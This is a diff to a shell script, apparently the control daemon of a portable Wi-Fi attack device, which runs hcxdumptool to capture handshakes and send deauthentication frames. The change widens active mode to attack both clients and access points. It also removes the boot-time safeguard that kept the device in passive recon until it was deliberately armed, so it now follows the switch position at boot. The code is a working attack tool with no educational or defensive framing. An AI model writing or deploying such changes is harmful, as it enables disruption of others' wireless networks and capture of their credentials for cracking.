@@ -320,7 +320,7 @@ start_deauth(){
   # Opt into active AP attacks (stronger, may wedge -> power-cycle to recover) with:
   #     touch /sd/bot/deauth-active
   ATK="--disable_client_attacks --disable_ap_attacks"; MODEWORD="PASSIVE capture"
-  [ -f /sd/bot/deauth-active ] && { ATK="--disable_client_attacks"; MODEWORD="ACTIVE deauth (AP)"; }
+  [ -f /sd/bot/deauth-active ] && { ATK=""; MODEWORD="ACTIVE deauth (client+AP)"; }
   echo "$(date) hcx $MODEWORD on $MON (protect $([ -s "$HCXFILTER" ] && wc -l < "$HCXFILTER" || echo 0) BSSIDs)" >> $LOG
   /sd/usr/sbin/hcxdumptool -i "$MON" -o "$OUT/capture_$TS.pcapng" $FILT \
       $ATK --enable_status=3 >> "$OUT/hcx-status.log" 2>&1 &
@@ -331,13 +331,14 @@ start_deauth(){
 }
 mount | grep -q '/sys/kernel/debug' || mount -t debugfs none /sys/kernel/debug 2>/dev/null
 echo "$(date) switch-mode daemon start" >> $LOG
-# ---- boot policy: ALWAYS start in recon; deauth must be armed by LEFT->RIGHT ----
-FORCE_RECON=1
+# ---- boot policy: FOLLOW THE SWITCH (RIGHT=deauth after settle); a prior deauth
+#      WEDGE forces recon until re-armed (LEFT->RIGHT) so a wedge can't bootloop ----
+FORCE_RECON=0
 if [ -f "$PENDING" ]; then
-  rm -f "$PENDING"
-  echo "$(date) boot: prior deauth did not stabilize (wedge). recon held; arm again with LEFT->RIGHT" >> $LOG
+  FORCE_RECON=1; rm -f "$PENDING"
+  echo "$(date) boot: prior deauth did not stabilize (wedge) -> recon held until switch LEFT then RIGHT" >> $LOG
 else
-  echo "$(date) boot: recon by default. move switch LEFT then RIGHT to arm deauth" >> $LOG
+  echo "$(date) boot: following switch position (RIGHT=deauth after ${SETTLE}s settle)" >> $LOG
 fi
 led recon
 # boot-settle grace (skipped once already up SETTLE seconds)
